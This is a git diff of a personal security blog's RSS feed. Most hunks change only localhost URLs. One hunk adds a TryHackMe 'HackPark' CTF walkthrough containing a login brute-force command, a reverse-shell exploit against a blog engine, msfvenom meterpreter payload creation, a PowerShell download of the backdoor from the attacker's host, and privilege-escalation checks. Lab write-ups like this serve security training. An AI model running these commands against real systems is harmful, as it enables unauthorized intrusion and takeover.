@@ -3,10 +3,10 @@
   <channel>
     <title>:~$ BBSec_</title>
     <description>Burak Baris</description>
-    <link>http://192.168.0.100:5554/</link>
-    <atom:link href="http://192.168.0.100:5554/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 07 Jan 2022 16:05:44 +0000</pubDate>
-    <lastBuildDate>Fri, 07 Jan 2022 16:05:44 +0000</lastBuildDate>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Fri, 07 Jan 2022 19:26:17 +0000</pubDate>
+    <lastBuildDate>Fri, 07 Jan 2022 19:26:17 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
     
       <item>
@@ -469,8 +469,8 @@ Verifying - Enter Export Password:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
         <pubDate>Wed, 05 Jan 2022 14:00:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2022/01/05/OpenSSL-CLI-Tool/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2022/01/05/OpenSSL-CLI-Tool/</guid>
+        <link>http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</link>
+        <guid isPermaLink="true">http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</guid>
         
         <category>OpenSSL</category>
         
@@ -644,8 +644,8 @@ Further reading and practice about how to create digital signatures and x.509 ce
 verify a document or certificate with &lt;a href=&quot;https://www.bbsec.net/2022/01/05/OpenSSL-CLI-Tool/&quot;&gt;&lt;em&gt;OpenSSL can be found here&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
 </description>
         <pubDate>Sat, 01 Jan 2022 16:00:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2022/01/01/public-key-infrastructure/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2022/01/01/public-key-infrastructure/</guid>
+        <link>http://localhost:4000/2022/01/01/public-key-infrastructure/</link>
+        <guid isPermaLink="true">http://localhost:4000/2022/01/01/public-key-infrastructure/</guid>
         
         <category>PKI</category>
         
@@ -735,32 +735,174 @@ However, it is not possible to exploit it since we do not have any information a
 
 &lt;h2 id=&quot;port-80-http-microsoft-iis-httpd-85&quot;&gt;Port 80 http Microsoft IIS httpd 8.5&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Information_Services&quot;&gt;&lt;strong&gt;Microsoft IIS&lt;/strong&gt;&lt;/a&gt; web server is running on port 80.
-&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;br /&gt;Let us quickly check the &lt;a href=&quot;https://www.cloudflare.com/learning/bots/what-is-robots.txt/&quot;&gt;robots.txt&lt;/a&gt; to see if we can find something interesting.
-&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 Nothing fancy here. Let us move on.
 &lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;https://github.com/maurosoria/dirsearch&quot;&gt;Dirsearch&lt;/a&gt; can help us to enumerate subdirectories of the webserver.
 Frameworks like &lt;strong&gt;GoBuster&lt;/strong&gt; and &lt;strong&gt;DirBuster&lt;/strong&gt; are also an option.
-&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 The &lt;strong&gt;/admin&lt;/strong&gt; directory might be interesting. However, the request to the directory gets redirected to a &lt;strong&gt;.aspx&lt;/strong&gt; file 
 which is probably a login form.
-&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 We will have to launch a &lt;a href=&quot;https://www.fortinet.com/resources/cyberglossary/brute-force-attack&quot;&gt;brute-force&lt;/a&gt; attack in order to
 gain access to the backend panel.
 &lt;br /&gt;&lt;br /&gt;There is only one blog post published on the main page, and the author of it is the &lt;strong&gt;ADMINISTRATOR&lt;/strong&gt;. 
 So we can assume that the only user registered to the panel is the admin’s itself.
-&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;exploitaton&quot;&gt;EXPLOITATON&lt;/h1&gt;
 
 &lt;h2 id=&quot;brute-forcing-the-panel&quot;&gt;Brute-Forcing the Panel&lt;/h2&gt;
 &lt;p&gt;In order to create continuous HTTP requests, we have to know how the HTTP request looks.
 Launch the &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-burp-suite/&quot;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; to examine the HTTP POST request sent 
-when a login attempt occurs.&lt;/p&gt;
+when a login attempt occurs.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/6.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;HTTP Post Request&lt;/em&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4&quot;&gt;&lt;strong&gt;application/x-www-form-urlencoded&lt;/strong&gt;&lt;/a&gt; header : Encoding type&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Username&lt;/strong&gt; : Username field&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Password&lt;/strong&gt; : Password Field&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;However, we need to include all the data section when posting the request. Otherwise we cannot get a healthy
+response from the webserver.
+I will use &lt;a href=&quot;https://cybersecnerds.com/ffuf-everything-you-need-to-know/&quot;&gt;&lt;strong&gt;ffuf&lt;/strong&gt;&lt;/a&gt; to create POST requests toward the web server.
+You can use any fuzzer tool like &lt;strong&gt;THC Hydra&lt;/strong&gt;, &lt;strong&gt;Burp Suite&lt;/strong&gt; or others. 
+&lt;br /&gt;Download &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;strong&gt;SecLists&lt;/strong&gt;&lt;/a&gt; repo with prepeared wordlists included.
+Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ~/Folders/pentest/SecLists/Passwords/probable-v2-top1575.txt:W1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.123.142/Account/login.aspx?ReturnURL=/admin/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VIEWSTATE=RH2j6pTwkTpekqaGFxbyyqhRtNI0NqgguLfakdexSgccBsTJEspUlTZqAM4QgzNfGiTveKSyUR8zQcskqfuAHSnpcldHQ9xwsDFI7TPd9qleqBeLqjTEaf0uWEXMNHGHBar%2Fd4Tpi6vKNeoMnRSF9UgcpGiDPoDm%2BS2kBhsBJqJ47zLb&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EVENTVALIDATION=iHNLSSqcnyAz7PNrH23YgFZ%2FinxPC1MSAVwjbKwwlbPU53tS7MftBm1t2tI37bKFNo1JvXCIgpZCsBc0Hy0zCU6jPybyZAob4Fm3Pmva7gRSUaDNTTb%2F3QgExGwRutGX4FnCQjvfJVEGodEZUU5p4vr8Xj6oe8MdxUtJM0CobBQGfLLs&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;amp;ctl00%24MainContent%24LoginUser%24Password=W1&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login failed&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Where:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Dedicated wordlists&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-u&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Target URL&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-data&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Data which will be sent with the request&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-H&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;HTTP headers that will be sent with the request&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-fr&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Regex which will be filtered out&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/8.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Starting the attack&lt;/em&gt;&lt;br /&gt;
+Since the password is not strong enough, we have managed to crack it in a matter of seconds.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/10.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Logging in to the panel as the admin.&lt;/em&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;searching-for-vulnerabilities&quot;&gt;Searching for Vulnerabilities&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Checking the version of the framework&lt;/em&gt;&lt;br /&gt;
+After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
+&lt;br /&gt;&lt;br /&gt;After gathering the version information, we can check &lt;a href=&quot;https://www.exploit-db.com/exploits/46353&quot;&gt;Exploit-db&lt;/a&gt; to see
+if there is any vulnerability on that version. I will use the &lt;strong&gt;searchsploit&lt;/strong&gt; utility, the CLI version
+of the Exploit-db.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+Multiple different exploits showed up. However, the first one is the 3.3.6 version specific. We are going to
+use that. &lt;a href=&quot;https://portswigger.net/web-security/file-path-traversal&quot;&gt;Click to read more about &lt;em&gt;File Path, Directory Traversal&lt;/em&gt;&lt;/a&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;hacking-into-the-users-shell&quot;&gt;Hacking into the user’s shell&lt;/h2&gt;
+&lt;p&gt;Download the exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Editing 46353.cs file&lt;/em&gt;&lt;br /&gt;
+Rename the file as &lt;strong&gt;PostView.ascx&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;Navigate to the Content tab, then click on the blog post to access the editor.
+Interact with the file manager to upload the exploit.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/13-1.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;File manager icon&lt;/em&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/14.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Uploading the exploit&lt;/em&gt;&lt;br /&gt;
+&lt;br /&gt;Make sure the post is saved to its’ newer version.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/15.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Updating the blogpost&lt;/em&gt;&lt;br /&gt;
+&lt;br /&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on your machine with the port that is defined in the exploit.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;To trigger the &lt;strong&gt;PostView.ascx&lt;/strong&gt; file and get the reverse shell send a GET request to this
+URL: &lt;strong&gt;http://{MACHINE IP}/?theme=../../App_Data/files&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;Exploit worked like a charm, and we got our shell.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;upgrading-to-the-meterpreter&quot;&gt;Upgrading to the Meterpreter&lt;/h2&gt;
+&lt;p&gt;Since the shell we got is a poor Netcat shell, it would be better to get a &lt;strong&gt;meterpreter&lt;/strong&gt; session
+to facilitate our scans in the system.&lt;br /&gt;&lt;br /&gt;
+Let’s create a meterpreter reverse shell binary with &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/msfvenom/&quot;&gt;msfvenom&lt;/a&gt;. 
+After successful creation, we need to upload this binary to the target machine. The shortest way to 
+do it is to start a Python server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;msfvenom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86/shikata_ga_nai&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revshell.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Creating meterpreter backdoor and starting a Python server&lt;/em&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;Download the backdoor to the target system with the following Powershell commands:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\Temp&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myfolder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myfolder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invoke-WebRequest http://{THM IP}:{PORT}/{FILE_NAME} -OutFile .\revshell.exe&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;We need to have a listener to accept incoming meterpreter connection.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
+handler &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THE PORT DEFINED IN THE BACKDOOR&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/22.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;Go back to the Netcat console, then run the backdoor as a background process with this command.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/21.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;Excellent! We got the meterpreter session.
+Right now, our control on the system is much more powerful than before.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/22-2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;privilege-escelation&quot;&gt;Privilege Escelation&lt;/h2&gt;
+&lt;p&gt;After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
+permissions against the system. &lt;strong&gt;PowerUp.ps1&lt;/strong&gt; is a program that facilitates fast checks in a windows machine to identify 
+any misconfigurations and privilege escalation possibilities.
+&lt;br /&gt;&lt;a href=&quot;https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;Download PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;&lt;strong&gt;PowerSploit GitHub Repo&lt;/strong&gt;&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/23.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Uploading the PowerUp.ps1 Powershell script to the target system.&lt;/em&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;Since this is a Powershell script, we need to have a Powershell instead of a regular windows command prompt.
+&lt;br /&gt;-Load the Powershell module and summon it.
+&lt;br /&gt;-Import the script as a powershell module.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerUp.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-AllChecks&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
         <pubDate>Fri, 31 Dec 2021 18:20:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/12/31/thm-hackpark-ctf-writeup/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/12/31/thm-hackpark-ctf-writeup/</guid>
+        <link>http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</guid>
         
         <category>TryHackme Machines</category>
         
@@ -1137,8 +1279,8 @@ By doing that, we have camouflaged our malicious process into a safer looking on
 Thanks for reading :)&lt;/p&gt;
 </description>
         <pubDate>Tue, 28 Dec 2021 08:40:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/12/28/thm-alfred-ctf-writeup/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/12/28/thm-alfred-ctf-writeup/</guid>
+        <link>http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</guid>
         
         <category>TryHackme Machines</category>
         
@@ -1449,8 +1591,8 @@ have fun after that point :))).
 &lt;p&gt;Thanks for reading.&lt;/p&gt;
 </description>
         <pubDate>Thu, 23 Dec 2021 00:59:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/12/23/unquoted-service-path-vulnerability/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/12/23/unquoted-service-path-vulnerability/</guid>
+        <link>http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</guid>
         
         <category>windows-privesc</category>
         
@@ -1705,8 +1847,8 @@ You will need to repeat previous steps to get the root flag. Download &lt;strong
 Thank you for following, wish you more penetrations ;)&lt;/p&gt;
 </description>
         <pubDate>Wed, 22 Dec 2021 21:50:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/12/22/thm-steel-mountain-ctf-writeup/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/12/22/thm-steel-mountain-ctf-writeup/</guid>
+        <link>http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</guid>
         
         <category>TryHackme Machines</category>
         
@@ -1751,8 +1893,8 @@ Thank you for following, wish you more penetrations ;)&lt;/p&gt;
 Done ! You will see all bootable system in your grub menu at the next boot.&lt;/p&gt;
 </description>
         <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/11/18/add-windows-boot-manager-to-grub/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/11/18/add-windows-boot-manager-to-grub/</guid>
+        <link>http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</guid>
         
         <category>linux</category>
         
@@ -1953,8 +2095,8 @@ layer. If ping responses with a packet loss, then the connectivity issue is on t
 this first. If there is no packet loss, you can start to explore other possibilities that may cause failure.&lt;/p&gt;
 </description>
         <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/11/18/ipv4-addresses/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/11/18/ipv4-addresses/</guid>
+        <link>http://localhost:4000/2021/11/18/ipv4-addresses/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/ipv4-addresses/</guid>
         
         <category>network protocols</category>
         
